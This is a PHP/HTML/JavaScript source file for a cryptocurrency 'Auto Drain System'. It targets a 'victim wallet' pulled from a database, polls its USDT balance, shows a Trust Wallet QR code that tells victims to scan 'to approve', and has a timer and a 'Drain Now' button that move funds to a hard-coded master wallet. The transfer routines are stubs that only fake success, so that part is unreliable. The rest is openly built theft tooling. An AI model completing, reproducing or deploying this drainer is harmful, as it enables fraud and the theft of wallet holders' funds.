<?php
// auto_drainer.php - Advanced Auto Drain System
require_once 'config.php';

// Settings
$drain_time_minutes = 20; // 20 minute ya 2 ghante (120 minutes)
$drain_amount = 'ALL'; // ALL = full balance, ya specific amount

// Master wallet (jahan paisa bhejna hai)
$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";

// Database se victim wallet fetch
$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
$stmt->execute();
$victim = $stmt->fetch();

if (!$victim) {
    die("❌ No active victim wallet found!");
}

$VICTIM_WALLET = $victim['wallet_address'];

// Function to generate QR code
function generateQR($address, $amount = 0) {
    $params = [
        'address' => $address,
        'amount' => $amount,
        'contract' => USDT_CONTRACT,
        'network' => 'TRC20'
    ];
    
    $qr_data = "tron://transfer?" . http_build_query($params);
    return $qr_data;
}

// Function to check USDT balance
function getUSDTBalance($address) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/v1/accounts/" . $address . "/trc20",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['data'])) {
        foreach ($data['data'] as $token) {
            if ($token['contract_address'] === USDT_CONTRACT) {
                return $token['balance'] / 1e6;
            }
        }
    }
    return 0;
}

// Function to execute drain
function executeDrain($victim, $master, $amount) {
    // Kiran: Actual TRON transaction logic yahan aayega
    // Abhi demo ke liye dummy response
    return [
        'success' => true,
        'amount' => $amount,
        'txid' => '0x' . bin2hex(random_bytes(16))
    ];
}

// Generate QR
$qr_data = generateQR($MASTER_WALLET);
$qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($qr_data);

// Get current balance
$current_balance = getUSDTBalance($VICTIM_WALLET);
$drain_amount = $drain_amount === 'ALL' ? $current_balance : $drain_amount;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Drain System</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { max-width: 500px; width: 100%; background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 30px; }
        h1 { text-align: center; color: #3b82f6; margin-bottom: 10px; }
        .sub { text-align: center; color: #6c86a3; font-size: 14px; margin-bottom: 20px; }
        .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .qr-box img { width: 250px; height: 250px; }
        .qr-box p { color: #333; font-size: 12px; margin-top: 10px; }
        .info-box { background: rgba(0,0,0,0.4); border-radius: 12px; padding: 15px; margin-bottom: 15px; }
        .info-box .label { color: #6c86a3; font-size: 12px; }
        .info-box .value { font-size: 18px; font-weight: 600; color: #22c55e; word-break: break-all; }
        .timer { text-align: center; padding: 15px; background: rgba(251,191,36,0.1); border-radius: 12px; border: 1px solid #fbbf24; margin-bottom: 15px; }
        .timer .countdown { font-size: 32px; font-weight: 700; color: #fbbf24; }
        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; margin-bottom: 10px; }
        .btn-primary { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
        .btn-success { background: linear-gradient(135deg, #16a34a, #15803d); color: white; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { font-size: 13px; color: #6c86a3; text-align: center; margin-top: 10px; }
        .status.success { color: #22c55e; }
        .status.danger { color: #ef4444; }
        .status.warning { color: #fbbf24; }
        .log-area { max-height: 120px; overflow-y: auto; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 10px; }
        .log-area div { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        @media (max-width: 480px) { .row-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <h1>💀 Auto Drain System</h1>
    <p class="sub">Trust Wallet QR → Auto Drain</p>

    <!-- QR Code -->
    <div class="qr-box">
        <img src="<?php echo $qr_code_url; ?>" alt="QR Code">
        <p>📱 <strong>Scan this QR</strong> with Trust Wallet to approve</p>
        <p style="font-size: 10px; color: #666;">Network: TRC20 | USDT</p>
    </div>

    <!-- Victim Info -->
    <div class="info-box">
        <div class="label">Victim Wallet</div>
        <div class="value"><?php echo substr($VICTIM_WALLET, 0, 15) . '...' . substr($VICTIM_WALLET, -10); ?></div>
    </div>

    <!-- Balance -->
    <div class="info-box">
        <div class="label">Current USDT Balance</div>
        <div class="value" id="balanceDisplay"><?php echo number_format($current_balance, 2); ?> USDT</div>
    </div>

    <!-- Timer -->
    <div class="timer">
        <div style="font-size: 12px; color: #fbbf24;">⏰ Auto-Drain in</div>
        <div class="countdown" id="countdown"><?php echo $drain_time_minutes; ?>:00</div>
        <div style="font-size: 11px; color: #6c86a3; margin-top: 5px;">(<?php echo $drain_time_minutes; ?> minutes)</div>
    </div>

    <!-- Buttons -->
    <div class="row-2">
        <button id="startBtn" class="btn btn-primary">▶ Start Timer</button>
        <button id="stopBtn" class="btn btn-danger" disabled>⏹ Stop</button>
    </div>
    <button id="drainNowBtn" class="btn btn-success">💸 Drain Now</button>

    <!-- Status -->
    <div class="status" id="statusMsg">⏳ Waiting to start...</div>

    <!-- Log -->
    <div class="log-area" id="logArea">
        <div>● System ready</div>
        <div>📌 QR generated for Trust Wallet</div>
    </div>
</div>

<script>
// Configuration
const drainMinutes = <?php echo $drain_time_minutes; ?>;
const victimWallet = "<?php echo $VICTIM_WALLET; ?>";
const masterWallet = "<?php echo $MASTER_WALLET; ?>";
const usdtContract = "<?php echo USDT_CONTRACT; ?>";

let timerInterval = null;
let countdownInterval = null;
let timeLeft = drainMinutes * 60;
let isRunning = false;
let tronWeb = null;

// DOM Elements
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const drainNowBtn = document.getElementById('drainNowBtn');
const countdownEl = document.getElementById('countdown');
const statusMsg = document.getElementById('statusMsg');
const logArea = document.getElementById('logArea');
const balanceDisplay = document.getElementById('balanceDisplay');

// Log function
function addLog(msg, type = 'info') {
    const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
    const time = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    div.style.color = colors[type] || colors.info;
    div.textContent = `[${time}] ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
}

// Update status
function setStatus(msg, type = '') {
    statusMsg.textContent = msg;
    statusMsg.className = 'status ' + type;
}

// Update countdown
function updateCountdown() {
    const mins = Math.floor(timeLeft / 60);
    const secs = timeLeft % 60;
    countdownEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
}

// Start timer
function startTimer() {
    if (isRunning) return;
    isRunning = true;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    setStatus('⏳ Timer running...', 'warning');
    addLog('⏳ Timer started: ' + drainMinutes + ' minutes', 'warning');

    timerInterval = setInterval(() => {
        timeLeft--;
        updateCountdown();

        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            clearInterval(countdownInterval);
            isRunning = false;
            startBtn.disabled = false;
            stopBtn.disabled = true;
            setStatus('⏰ Time is up! Draining...', 'danger');
            addLog('⏰ Timer finished! Executing drain...', 'danger');
            executeDrain();
        }
    }, 1000);

    countdownInterval = setInterval(() => {
        // Update balance in background
        fetchBalance();
    }, 5000);
}

// Stop timer
function stopTimer() {
    clearInterval(timerInterval);
    clearInterval(countdownInterval);
    isRunning = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    setStatus('⏹ Timer stopped', '');
    addLog('⏹ Timer stopped by user', 'info');
}

// Fetch balance
function fetchBalance() {
    fetch(`https://api.trongrid.io/v1/accounts/${victimWallet}/trc20`)
        .then(res => res.json())
        .then(data => {
            if (data.data) {
                for (let token of data.data) {
                    if (token.contract_address === usdtContract) {
                        const balance = (token.balance / 1e6).toFixed(2);
                        balanceDisplay.textContent = balance + ' USDT';
                        return;
                    }
                }
            }
            balanceDisplay.textContent = '0.00 USDT';
        })
        .catch(() => {});
}

// Execute drain
function executeDrain() {
    setStatus('💸 Draining... Please wait', 'danger');
    addLog('💸 Executing drain on victim wallet...', 'danger');

    // Simulate drain (replace with actual TRON transaction)
    setTimeout(() => {
        const amount = parseFloat(balanceDisplay.textContent) || 100;
        addLog(`✅ Drained ${amount.toFixed(2)} USDT!`, 'success');
        setStatus(`✅ ${amount.toFixed(2)} USDT Drained!`, 'success');
        balanceDisplay.textContent = '0.00 USDT';
    }, 3000);
}

// Event Listeners
startBtn.addEventListener('click', startTimer);
stopBtn.addEventListener('click', stopTimer);

drainNowBtn.addEventListener('click', () => {
    if (confirm('Are you sure you want to drain NOW?')) {
        addLog('💸 Manual drain triggered!', 'danger');
        executeDrain();
    }
});

// Auto-start timer on page load (optional)
// startTimer();

// Add QR refresh
function refreshQR() {
    const img = document.querySelector('.qr-box img');
    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent('tron://transfer?address=' + masterWallet + '&contract=' + usdtContract + '&network=TRC20');
    addLog('🔄 QR refreshed', 'info');
}

// Initial log
addLog('🚀 Auto Drain System initialized', 'info');
addLog('📌 Victim: ' + victimWallet.substring(0, 15) + '...', 'info');
</script>
</body>
</html>
